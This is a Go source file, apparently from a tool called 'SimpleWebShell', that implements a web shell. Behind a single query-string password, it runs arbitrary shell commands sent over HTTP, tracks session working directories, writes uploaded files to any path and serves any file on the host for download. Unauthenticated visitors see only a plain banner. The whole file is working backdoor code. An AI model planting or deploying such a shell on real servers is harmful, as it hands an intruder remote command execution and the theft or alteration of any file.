package route

import (
	"SimpleWebShell/pages"
	"SimpleWebShell/session"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"

	"os/exec"

	"github.com/gin-gonic/gin"
)

// 处理根路径
func handleRoot(c *gin.Context) {
	// 检查密钥
	key := c.Query("key")
	if key != password {
		// 密钥不正确，只显示基本信息
		c.String(http.StatusOK, "SimpleWebshell 1.0.20260826 By FasterEdge")
		return
	}

	// 密钥正确，显示WebShell界面
	c.Header("Content-Type", "text/html; charset=utf-8")
	c.String(http.StatusOK, pages.GetWebShellHTML())
}

// session 创建
func handleSessionCreate(c *gin.Context) {
	key := c.Query("key")
	if key != password {
		c.String(http.StatusUnauthorized, "Unauthorized")
		return
	}
	id := session.New()
	c.String(http.StatusOK, id)
}

// session 列表
func handleSessionList(c *gin.Context) {
	key := c.Query("key")
	if key != password {
		c.String(http.StatusUnauthorized, "Unauthorized")
		return
	}
	list := session.List()
	var b strings.Builder
	for id, info := range list {
		_, _ = fmt.Fprintf(&b, "%s\t%s\n", id, info.Dir)
	}
	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.String(http.StatusOK, b.String())
}

// session 删除
func handleSessionDelete(c *gin.Context) {
	key := c.Query("key")
	if key != password {
		c.String(http.StatusUnauthorized, "Unauthorized")
		return
	}
	sessID := c.Query("session")
	if sessID == "" {
		c.String(http.StatusBadRequest, "session 不存在")
		return
	}
	if !session.Delete(sessID) {
		c.String(http.StatusBadRequest, "session 不存在")
		return
	}
	c.String(http.StatusOK, "session 已删除")
}

// 返回当前工作目录（带 key + session 验证）
func handleGetCurrentPath(c *gin.Context) {
	key := c.Query("key")
	if key != password {
		c.String(http.StatusUnauthorized, "Unauthorized")
		return
	}
	sessID := c.Query("session")
	if sessID != "" && !session.Exists(sessID) {
		c.String(http.StatusBadRequest, "session 不存在")
		return
	}

	if sessID == "" {
		dir, _ := os.Getwd()
		c.Header("Content-Type", "text/plain; charset=utf-8")
		c.String(http.StatusOK, dir)
		return
	}

	dir, ok := session.GetDir(sessID)
	if !ok {
		c.String(http.StatusBadRequest, "session 不存在")
		return
	}

	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.String(http.StatusOK, dir)
}

// 处理GET请求执行shell命令
func handleGet(c *gin.Context) {
	// 验证密钥
	key := c.Query("key")
	if key != password {
		c.String(http.StatusUnauthorized, "Unauthorized")
		return
	}

	sessID := c.Query("session")
	if sessID != "" && !session.Exists(sessID) {
		c.String(http.StatusBadRequest, "session 不存在")
		return
	}

	// 获取命令并进行URL解码
	cmdEncoded := c.Query("cmd")
	if cmdEncoded == "" {
		c.String(http.StatusBadRequest, "缺少cmd参数")
		return
	}

	// URL解码命令参数
	cmd, err := url.QueryUnescape(cmdEncoded)
	if err != nil {
		c.String(http.StatusBadRequest, fmt.Sprintf("命令参数解码错误: %v", err))
		return
	}

	// 执行命令
	result, err := executeCommandWithSession(sessID, cmd)
	if err != nil {
		c.String(http.StatusInternalServerError, fmt.Sprintf("命令执行错误: %v\n%s", err, result))
		return
	}

	// 如果使用了 session 并且执行成功，则记录历史
	if sessID != "" {
		// 记录原始命令到会话历史（异步安全）
		session.AppendHistory(sessID, cmd)
	}

	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.String(http.StatusOK, result)
}

// 处理POST请求执行shell命令
func handlePost(c *gin.Context) {
	// 检查Content-Type
	contentType := c.GetHeader("Content-Type")

	var key, cmd, sessID string

	if strings.Contains(contentType, "application/json") {
		// 处理JSON格式
		var jsonData struct {
			Key     string `json:"key"`
			Cmd     string `json:"cmd"`
			Session string `json:"session"`
		}

		if err := c.ShouldBindJSON(&jsonData); err != nil {
			c.String(http.StatusBadRequest, fmt.Sprintf("JSON解析错误: %v", err))
			return
		}

		key = jsonData.Key
		cmd = jsonData.Cmd
		sessID = jsonData.Session
	} else {
		// 处理表单格式（向后兼容）
		key = c.PostForm("key")
		cmd = c.PostForm("cmd")
		sessID = c.PostForm("session")
	}

	// 验证密钥
	if key != password {
		c.String(http.StatusUnauthorized, "Unauthorized")
		return
	}

	if sessID != "" && !session.Exists(sessID) {
		c.String(http.StatusBadRequest, "session 不存在")
		return
	}

	// 获取命令
	if cmd == "" {
		c.String(http.StatusBadRequest, "缺少cmd参数")
		return
	}

	// 执行命令
	result, err := executeCommandWithSession(sessID, cmd)
	if err != nil {
		c.String(http.StatusInternalServerError, fmt.Sprintf("命令执行错误: %v\n%s", err, result))
		return
	}

	// 如果使用了 session 并且执行成功，则记录历史
	if sessID != "" {
		session.AppendHistory(sessID, cmd)
	}

	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.String(http.StatusOK, result)
}

// 执行命令，支持 session 内的当前工作目录并处理 cd
func executeCommandWithSession(sessID, cmdStr string) (string, error) {
	cmdStr = strings.TrimSpace(cmdStr)
	if cmdStr == "" {
		return "", nil
	}

	// 如果没带 session，使用进程当前目录执行（兼容老行为）
	if sessID == "" {
		return runShellInDir(cmdStr, "")
	}

	// 检查 session 是否存在
	curDir, ok := session.GetDir(sessID)
	if !ok {
		return "session 不存在", fmt.Errorf("session 不存在")
	}

	trim := strings.TrimSpace(cmdStr)
	if strings.HasPrefix(trim, "cd") {
		parts := strings.SplitN(cmdStr, "&&", 2)
		first := strings.TrimSpace(parts[0])
		target := strings.TrimSpace(strings.TrimPrefix(first, "cd"))
		if target == "" {
			target = os.Getenv("HOME")
		}
		if strings.HasPrefix(target, "~") {
			target = filepath.Join(os.Getenv("HOME"), strings.TrimPrefix(target, "~"))
		}
		var newdir string
		if filepath.IsAbs(target) {
			newdir = filepath.Clean(target)
		} else {
			newdir = filepath.Clean(filepath.Join(curDir, target))
		}
		if fi, err := os.Stat(newdir); err == nil && fi.IsDir() {
			session.SetDir(sessID, newdir)
		} else {
			return fmt.Sprintf("cd: %s: no such directory", target), nil
		}

		if len(parts) == 2 {
			rest := strings.TrimSpace(parts[1])
			return runShellInDir(rest, session.MustGetDir(sessID))
		}
		return fmt.Sprintf("changed directory to %s", session.MustGetDir(sessID)), nil
	}

	return runShellInDir(cmdStr, curDir)
}

func runShellInDir(cmdStr, dir string) (string, error) {
	var cmd *exec.Cmd

	// 根据shell类型使用不同的参数
	shellLower := strings.ToLower(shellPath)
	if strings.Contains(shellLower, "cmd") || strings.Contains(shellLower, "cmd.exe") {
		cmd = exec.Command(shellPath, "/c", cmdStr)
	} else if strings.Contains(shellLower, "powershell") || strings.Contains(shellLower, "pwsh") {
		cmd = exec.Command(shellPath, "-Command", cmdStr)
	} else { // 默认假设为类Unix shell
		cmd = exec.Command(shellPath, "-c", cmdStr)
	}

	cmd.Dir = dir

	output, err := cmd.CombinedOutput()
	return string(output), err
}

// 处理文件上传
// 上传使用 multipart/form-data，支持 path 字段（目标全路径或目录）
func handleFileSend(c *gin.Context) {
	// 优先从 query 获取 key
	key := c.Query("key")
	if key != password {
		c.String(http.StatusUnauthorized, "Unauthorized")
		return
	}

	// 获取 multipart reader 以流式处理上传，避免内存限制
	mr, err := c.Request.MultipartReader()
	if err != nil {
		c.String(http.StatusBadRequest, fmt.Sprintf("解析 multipart 数据失败: %v", err))
		return
	}

	ctx := c.Request.Context()
	var savedFiles []string
	var destPath string // 来自表单的目标路径（可以是目录或完整路径）
	defer func() {
		// 在处理完毕若发生 panic/错误，清理已写入的临时文件（如果需要）
		if r := recover(); r != nil {
			for _, f := range savedFiles {
				_ = os.Remove(f)
			}
			c.String(http.StatusInternalServerError, fmt.Sprintf("上传处理发生异常: %v", r))
		}
	}()

	// 处理 multipart 各部分，支持普通字段和文件字段
	for {
		part, perr := mr.NextPart()
		if perr == io.EOF {
			break
		}
		if perr != nil {
			// 读取错误
			for _, f := range savedFiles {
				_ = os.Remove(f)
			}
			c.String(http.StatusInternalServerError, fmt.Sprintf("读取 multipart 部分失败: %v", perr))
			return
		}

		if part.FileName() == "" {
			// 普通表单字段，读取内容
			name := part.FormName()
			data, _ := io.ReadAll(part)
			_ = part.Close()
			val := strings.TrimSpace(string(data))
			if name == "path" {
				destPath = val
			}
			continue
		}

		// 文件字段
		filename := filepath.Base(part.FileName())

		// 计算输出路径：如果表单指定了 destPath
		var outPath string
		if destPath == "" {
			outPath = filename
		} else {
			// 如果 destPath 指向一个已存在的目录或以路径分隔符结尾，则把文件名追加到目录
			if fi, err := os.Stat(destPath); err == nil && fi.IsDir() {
				outPath = filepath.Join(destPath, filename)
			} else if strings.HasSuffix(destPath, string(os.PathSeparator)) {
				outPath = filepath.Join(destPath, filename)
			} else {
				// 否则把 destPath 当作完整文件路径（覆盖或创建）
				outPath = destPath
			}
		}

		// 确保目标目录存在
		if dir := filepath.Dir(outPath); dir != "" {
			_ = os.MkdirAll(dir, 0755)
		}

		outFile, ferr := os.Create(outPath)
		if ferr != nil {
			_ = part.Close()
			for _, f := range savedFiles {
				_ = os.Remove(f)
			}
			c.String(http.StatusInternalServerError, fmt.Sprintf("创建文件失败: %v", ferr))
			return
		}

		savedFiles = append(savedFiles, outPath)

		// 流式拷贝，支持取消
		buf := make([]byte, 32*1024)
		for {
			// 检查客户端是否已经取消
			select {
			case <-ctx.Done():
				// 取消，关闭文件并删除部分写入的文件
				_ = outFile.Close()
				_ = os.Remove(outPath)
				c.String(http.StatusRequestTimeout, "上传已取消")
				return
			default:
			}

			n, rerr := part.Read(buf)
			if n > 0 {
				if _, werr := outFile.Write(buf[:n]); werr != nil {
					_ = outFile.Close()
					_ = os.Remove(outPath)
					c.String(http.StatusInternalServerError, fmt.Sprintf("写入文件失败: %v", werr))
					return
				}
			}
			if rerr != nil {
				if rerr == io.EOF {
					break
				}
				_ = outFile.Close()
				_ = os.Remove(outPath)
				c.String(http.StatusInternalServerError, fmt.Sprintf("读取上传数据失败: %v", rerr))
				return
			}
		}

		_ = outFile.Close()
		// 如果只需要处理第一个文件则可以 break，否则继续
		break
	}

	// 上传完成
	c.Header("Content-Type", "application/json; charset=utf-8")
	c.String(http.StatusOK, fmt.Sprintf(`{"status":"ok","files":%q,"message":"上传完成"}`, savedFiles))
}

// 处理文件下载
// 请求示例: /file_receive?key=xxx&path=/full/path/to/file
func handleFileReceive(c *gin.Context) {
	// 验证密钥
	key := c.Query("key")
	if key != password {
		c.String(http.StatusUnauthorized, "Unauthorized")
		return
	}

	filePath := c.Query("path")
	if filePath == "" {
		c.String(http.StatusBadRequest, "缺少path参数")
		return
	}

	// 打开文件
	f, err := os.Open(filePath)
	if err != nil {
		c.String(http.StatusNotFound, fmt.Sprintf("打开文件失败: %v", err))
		return
	}
	defer func() { _ = f.Close() }()

	// 获取文件信息
	fi, err := f.Stat()
	if err != nil {
		c.String(http.StatusInternalServerError, fmt.Sprintf("获取文件信息失败: %v", err))
		return
	}

	// 设置头
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", fi.Name()))
	c.Header("Content-Type", "application/octet-stream")
	c.Header("Content-Length", fmt.Sprintf("%d", fi.Size()))
	c.Header("Last-Modified", fi.ModTime().UTC().Format(http.TimeFormat))

	// 支持客户端取消
	ctx := c.Request.Context()
	buf := make([]byte, 32*1024)
	for {
		select {
		case <-ctx.Done():
			// 客户端取消
			return
		default:
		}

		n, rerr := f.Read(buf)
		if n > 0 {
			if _, werr := c.Writer.Write(buf[:n]); werr != nil {
				return
			}
			// 刷新，使数据尽快发送
			if flusher, ok := c.Writer.(http.Flusher); ok {
				flusher.Flush()
			}
		}
		if rerr != nil {
			if rerr == io.EOF {
				break
			}
			// 读取错误
			return
		}
	}

	// 下载完成，简单记录时间（或返回日志）
	_ = time.Now()
}

// 返回指定 session 的详细信息（JSON），需要 key 和 session 参数
func handleSessionGet(c *gin.Context) {
	key := c.Query("key")
	if key != password {
		c.String(http.StatusUnauthorized, "Unauthorized")
		return
	}
	sessID := c.Query("session")
	if sessID == "" {
		c.String(http.StatusBadRequest, "session 不存在")
		return
	}
	list := session.List()
	info, ok := list[sessID]
	if !ok {
		c.String(http.StatusBadRequest, "session 不存在")
		return
	}

	c.JSON(http.StatusOK, info)
}
